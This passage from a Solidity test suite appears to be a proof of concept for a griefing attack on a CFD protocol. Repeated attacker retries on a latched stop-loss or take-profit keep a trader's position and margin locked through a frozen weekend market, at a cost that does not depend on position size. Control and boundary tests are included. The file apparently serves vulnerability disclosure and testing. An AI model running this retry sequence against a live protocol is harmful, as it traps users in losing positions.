        console2.log("loss cap (6 dec)", LOSS_CAP);
        console2.log("price loss if Alice could exit at the gap (6 dec)", _lossAt(GAP_PRICE));
        console2.log("price loss after 24h locked (6 dec)", _lossAt(price));
        assertEq(_size(ALICE), POSITION_SIZE, "stop-loss position locked for 24 hours");
    }

    // ---------------- weekend: a live-calibrated fee ceiling fails on the frozen spread ----------------

    /// Friday 17:00 New York, when the oracle freezes (`CfdEngine.isOracleFrozen`); 30 minutes after the fixture's
    /// `FRIDAY_FAD_START` on its calendar date.
    uint256 internal constant FRIDAY_FREEZE = FRIDAY_FAD_START + 30 minutes;

    /// Alice's take-profit with an explicit-fee ceiling of 3x the live execution fee: generous in a live market,
    /// below the frozen-market close cost (execution fee + 50 bps frozen spread).
    function _weekendSetupAt(uint256 triggerTime)
        internal
        returns (uint64 protectionId, uint64 attemptId, uint256 ceiling)
    {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        uint256 notionalAtTp = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        ceiling = 3 * (notionalAtTp * engine.executionFeeBps()) / 10_000;
        params.closeLimits.maxExplicitFeesAssets = ceiling;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        vm.warp(triggerTime - 1); // _triggerAt advances one second
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(LONG_TAKE_PROFIT);
        attemptId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        assertFalse(engine.isOracleFrozen(), "triggered in the live market");
    }

    /// The take-profit is crossed at Friday's close and triggered with the last live tick, 10 s before the freeze.
    /// No later live tick exists, so the attempt can only execute in the frozen market.
    function _weekendSetup() internal returns (uint64 protectionId, uint64 attemptId, uint256 ceiling) {
        return _weekendSetupAt(FRIDAY_FREEZE - 10);
    }

    function _toFrozen(uint256 hoursAfterFad) internal {
        vm.warp(FRIDAY_FAD_START + hoursAfterFad * 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// The first execution after the freeze, inside the attempt's window: it fails on the frozen spread.
    function _keeperFailsAtFreeze(uint64 attemptId) internal {
        vm.warp(FRIDAY_FREEZE + 1);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "frozen weekend");
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, new bytes[](0));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "frozen spread breaks the live ceiling");
    }

    /// Control A: triggered earlier in the live session, the same ceiling closes the take-profit on the next live tick.
    function test_weekend_control_liveCloseFitsCeiling() public {
        (, uint64 attemptId, uint256 ceiling) = _weekendSetupAt(FRIDAY_FAD_START - 120);
        _nextBlock(2);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, _mockPythUpdateData(LONG_TAKE_PROFIT));
        console2.log("explicit-fee ceiling (6 dec)", ceiling);
        assertEq(_size(ALICE), 0, "live close fits the ceiling");
    }

    /// Control B: weekend without an attacker. The first frozen execution fails on the spread, Alice raises the
    /// ceiling and exits during the weekend (the protocol's frozen-market close liveness).
    function test_weekend_control_ownerExitsWithoutAttacker() public {
        (uint64 protectionId, uint64 attemptId,) = _weekendSetup();
        _keeperFailsAtFreeze(attemptId);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, "latched");
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        vm.prank(ALICE);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(retryId, new bytes[](0));
        assertEq(_size(ALICE), 0, "owner exits during the weekend");
    }

    /// Attack: the whole frozen period. Each hour the keeper executes the attempt (frozen attempts are executable at
    /// once), it fails on the spread, and the attacker retries. Alice also processes the fresh attempt herself: it
    /// fails on the spread and relatches, and the attacker's retry lands before her separately signed amendment.
    function test_weekend_attack_lockedAllWeekend() public {
        (uint64 protectionId, uint64 attemptId,) = _weekendSetup();
        uint256 lastHour;
        uint256 retryGas;
        uint256 retries;
        uint256 g;
        _keeperFailsAtFreeze(attemptId);
        (attemptId, g) = _retryAsAttacker(protectionId);
        retryGas += g;
        ++retries;
        _ownerActionsRevert(protectionId);
        for (uint256 h = 1; h <= 72; ++h) {
            _toFrozen(h);
            if (!engine.isOracleFrozen()) break; // market reopened: live fills fit the ceiling again
            lastHour = h;
            // the stale attempt is cleaned up and the attacker retries at once
            vm.prank(EXECUTION_KEEPER);
            router.executeOrder(attemptId, new bytes[](0));
            (attemptId, g) = _retryAsAttacker(protectionId);
            retryGas += g;
            ++retries;
            // the keeper executes the fresh attempt at once (frozen): it fails on the spread; the attacker retries
            vm.prank(EXECUTION_KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, new bytes[](0));
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "keeper: frozen spread breaks the ceiling");
            (attemptId, g) = _retryAsAttacker(protectionId);
            retryGas += g;
            ++retries;
            _ownerActionsRevert(protectionId);

            // Alice processes the fresh attempt herself: it fails on the spread and relatches
            vm.prank(ALICE);
            r = router.executeOrder(attemptId, new bytes[](0));
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "owner: frozen spread breaks the ceiling");
            (attemptId, g) = _retryAsAttacker(protectionId);
            retryGas += g;
            ++retries;
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
            assertEq(_size(ALICE), POSITION_SIZE, "position stays open");
        }
        console2.log("hours locked in the frozen weekend", lastHour);
        console2.log("attacker retries / avg gas per retry", retries, retryGas / retries);
        assertGe(lastHour, 24, "lock spans more than 24 hours");
        assertEq(_size(ALICE), POSITION_SIZE, "locked for the whole weekend");
    }

    // ---------------- weekend: a Friday stop-loss lock carried through the frozen market ----------------

    /// One live hour: the stale attempt is cleaned up and retried; at the next tick the keeper executes the fresh
    /// attempt, it fails on the loss cap, and the attacker retries again. Every owner action reverts.
    function _liveExchange(uint64 protectionId, uint64 attemptId, uint256 price) internal returns (uint64) {
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, _mockPythUpdateData(price));
        (attemptId,) = _retryAsAttacker(protectionId);
        _keeperFailsAt(attemptId, price);
        (attemptId,) = _retryAsAttacker(protectionId);
        _ownerActionsRevert(protectionId);
        return attemptId;
    }

    /// One frozen hour: the price is frozen beyond the cap, so the keeper's execution and the owner's own execution
    /// both fail; the attacker's retry lands before the owner's separately signed amendment.
    function _frozenExchange(uint64 protectionId, uint64 attemptId) internal returns (uint64) {
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, new bytes[](0));
        (attemptId,) = _retryAsAttacker(protectionId);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, new bytes[](0));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "keeper: frozen close beyond the cap");
        (attemptId,) = _retryAsAttacker(protectionId);
        _ownerActionsRevert(protectionId);

        vm.prank(ALICE);
        r = router.executeOrder(attemptId, new bytes[](0));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "owner: frozen close beyond the cap");
        (attemptId,) = _retryAsAttacker(protectionId);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        return attemptId;
    }

    /// Attack: the stop-loss gaps through its cap on Friday at 12:00 New York. The attacker holds the lock through the
    /// afternoon; after the close the price is frozen beyond the cap and cannot come back, so every frozen attempt
    /// fails as well, and the position stays locked until the Sunday reopen.
    function test_weekend_attack_fridayStopLossLockedUntilReopen() public {
        vm.warp(FRIDAY_FREEZE - 5 hours); // Friday 12:00 New York
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(MARK_PRICE);
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        uint256 t0 = vm.getBlockTimestamp();
        _keeperFailsAt(attemptId, GAP_PRICE);
        (attemptId,) = _retryAsAttacker(protectionId);
        _ownerActionsRevert(protectionId);

        uint256 liveHours;
        uint256 frozenHours;
        for (uint256 h = 1; h <= 80; ++h) {
            vm.warp(t0 + h * 1 hours);
            vm.roll(vm.getBlockNumber() + 1);
            if (engine.isOracleFrozen()) {
                attemptId = _frozenExchange(protectionId, attemptId);
                ++frozenHours;
            } else if (frozenHours == 0) {
                attemptId = _liveExchange(protectionId, attemptId, GAP_PRICE);
                ++liveHours;
            } else {
                break; // Sunday reopen
            }
            assertEq(_size(ALICE), POSITION_SIZE, "position stays open");
        }
        console2.log("locked: Friday live hours / frozen weekend hours", liveHours, frozenHours);
        console2.log("locked hours in total", liveHours + frozenHours);
        assertGe(frozenHours, 24, "locked through the frozen weekend");
        assertEq(_size(ALICE), POSITION_SIZE, "locked from Friday noon until the reopen");
    }

    // ---------------- depth ----------------

    /// What is frozen: free settlement stays withdrawable and margin can be added; the position, its pledged margin
    /// and its PnL cannot be closed, reduced or released.
    function test_depth_whatIsFrozen() public {
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        _keeperFailsAt(attemptId, GAP_PRICE);
        _retryAsAttacker(protectionId);

        uint256 pledged = clearinghouse.getLockedMarginBuckets(ALICE).positionMarginAssets;
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(ALICE);
        console2.log("pledged position margin (6 dec)", pledged);
        console2.log("free settlement (6 dec)", free);

        _refreshMark(GAP_PRICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, free / 2); // free cash still leaves
        vm.prank(ALICE);
        engine.addMargin(ALICE, 100e6); // more margin can still go in
        uint256 pledgedAfter = clearinghouse.getLockedMarginBuckets(ALICE).positionMarginAssets;
        assertApproxEqAbs(pledgedAfter, pledged + 100e6, 1e6, "added margin joins the locked position (minus carry)");
        console2.log("pledged after adding 100 USDG (6 dec)", pledgedAfter);
        uint256 overFree = clearinghouse.getFreeBuyingPowerAssets(ALICE) + 1;
        vm.prank(ALICE);
        vm.expectRevert();
        clearinghouse.withdraw(ALICE, overFree); // pledged margin does not leave
        _ownerActionsRevert(protectionId);
    }

    /// Without any keeper and without oracle data: the attacker only expires the stale attempt and retries, once per
    /// execution window.
    function test_depth_expiryOnlyMode() public {
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        ExpiryGriefer griefer = new ExpiryGriefer();
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 actions;
        uint256 t0 = vm.getBlockTimestamp();
        while (vm.getBlockTimestamp() < t0 + 10 minutes) {
            uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            attemptId = griefer.expireAndRetry(address(router), address(protectionActions), attemptId, protectionId);
            ++actions;
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        }
        console2.log("expiry-only: window (s) / attacker transactions in 10 min", window, actions);
        assertEq(_size(ALICE), POSITION_SIZE, "locked without executing anything");
    }

    /// The attacker processes each attempt itself and retries in the same transaction: the attempt fails on the cap,
    /// relatches and is retried before the transaction ends, so the protection never ends a transaction Latched.
    function test_depth_executeAndRetryInOneTransaction() public {
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        ExecuteAndRetry attacker = new ExecuteAndRetry();
        for (uint256 i; i < 5; ++i) {
            _nextBlock(2); // the next qualifying tick
            bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
            uint64 previous = attemptId;
            attemptId = attacker.cycle(address(router), address(protectionActions), attemptId, protectionId, data);
            assertGt(attemptId, previous, "a fresh attempt was queued in the same transaction");
            _ownerActionsRevert(protectionId);
        }
        assertEq(_size(ALICE), POSITION_SIZE, "position locked");
    }

    /// The attacker's cost does not depend on the position: the same retry locks a stop-loss position 1,000x larger
    /// (10,000,000 USDG notional, 2,000,000 USDG margin) as it does the 10,000 USDG one.
    function test_depth_costIndependentOfPositionSize() public {
        uint256 snap = vm.snapshotState();
        uint256 gasLarge = _firstRetryGasAtScale(1000);
        vm.revertToState(snap);
        uint256 gasSmall = _firstRetryGasAtScale(1);
        console2.log("retry gas, 10,000 USDG position", gasSmall);
        console2.log("retry gas, 10,000,000 USDG position", gasLarge);
        assertApproxEqRel(gasLarge, gasSmall, 0.01e18, "same retry cost at 1,000x the position");
    }

    function _firstRetryGasAtScale(uint256 k) internal returns (uint256 gasUsed) {
        _fundJunior(address(0x11D), 100_000_000e6); // pool depth for the large position, same in both runs
        _fundTrader(ALICE, POSITION_MARGIN_ASSETS * k);
        _refreshMark(MARK_PRICE);
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE * k, POSITION_MARGIN_ASSETS * k, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, SL_PRICE);
        params.closeLimits.maxGrossAccountDebitAssets = LOSS_CAP * k;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 attemptId = _triggerAt(protectionId, GAP_PRICE);
        _keeperFailsAt(attemptId, GAP_PRICE);
        (, gasUsed) = _retryAsAttacker(protectionId);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, "locked");
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        assertEq(_size(ALICE), POSITION_SIZE * k, "position locked");
    }

    // ---------------- boundaries ----------------

    /// Boundary 1: when a tick prints within Alice's stored limits again, executing the pending attempt closes the
    /// position; the attacker cannot stop others from executing it.
    function test_boundary_priceBackWithinLimits() public {
        (uint64 protectionId, uint64 attemptId) = _stopLossSetup();
        _keeperFailsAt(attemptId, GAP_PRICE);
        (attemptId,) = _retryAsAttacker(protectionId);
        _nextBlock(2);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, _mockPythUpdateData(102_500_000)); // 1.025: 250 loss + fees, within the cap
        assertEq(_size(ALICE), 0, "a fill within the stored limits closes the position");
    }

    /// Boundary 2: an owner whose amendment is sequenced right after the attempt is processed, with nothing between,
    /// exits. Here Alice processes the frozen attempt and amends back to back (or in one batch from a contract
    /// account); in a live market the same works only if she processes the attempt before anyone else at its tick.
    function test_boundary_ownerProcessesAndAmendsBackToBack() public {
        (uint64 protectionId, uint64 attemptId,) = _weekendSetup();
        _toFrozen(3);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, new bytes[](0));
        (attemptId,) = _retryAsAttacker(protectionId);

        vm.prank(ALICE);
        router.executeOrder(attemptId, new bytes[](0));
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideLimits());
        vm.prank(ALICE);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(retryId, new bytes[](0));
        assertEq(_size(ALICE), 0, "back-to-back owner exits");
    }
}
```

